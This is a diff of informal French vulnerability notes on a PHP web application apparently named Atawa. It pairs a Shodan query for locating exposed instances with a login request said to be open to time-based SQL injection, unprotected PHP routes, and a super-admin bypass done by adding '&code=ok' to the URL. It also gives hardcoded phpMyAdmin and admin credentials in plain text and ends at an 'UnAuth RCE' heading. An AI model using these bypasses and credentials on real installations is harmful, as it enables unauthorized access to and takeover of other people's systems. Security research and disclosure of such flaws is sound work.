@@ -6,7 +6,7 @@ shodan : http.favicon.hash:-991649870
 
 --- SQLi sur le login mais time based on se fait chier ---
 
----------------------------------------------------------------
+
 POST /index_connexion_atawa.php?resolution=1920x1080 HTTP/1.1
 Host: xx
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
@@ -21,28 +21,36 @@ Cookie: PHPSESSID=ww
 Upgrade-Insecure-Requests: 1
 
 login=test&pwd=test
-------------------------------------------------------
+
+
 
 --- Vlà les manques de controle d'accès sur les fichiers .php dont route sont décritent dans les fichiers js--- 
 
----------------------------------------------------------------
+
+
 /choix/choix_version_svg.php?resolution=1920x1080
+
 /config/configubuntu.php?resolution=1920x1080
 ...
----------------------------------------------------------------
+
 
 --- Bypass auth super-admin (alors celle la..) ---
 
----------------------------------------------------------------
+
+
 /systeme/super_administrateur.php?resolution=1920x1080 (oh lala besoin d'un mdp..)
+
 /systeme/super_administrateur.php?resolution=1920x1080&code=ok (ah non c'est bon)
----------------------------------------------------------------
+
 
 --- Hardcoded creds ---
----------------------------------------------------------------
+
+
 /phpmyadminatawa/index.php (MySQL_Atawa:Atawa&13)
+
 /systeme/super_administrateur.php (33310 - hardcoded dans le js..)
----------------------------------------------------------------
+
+
 
 --- UnAuth RCE (ayayay vie d'ma mèrrrrrr)---
 
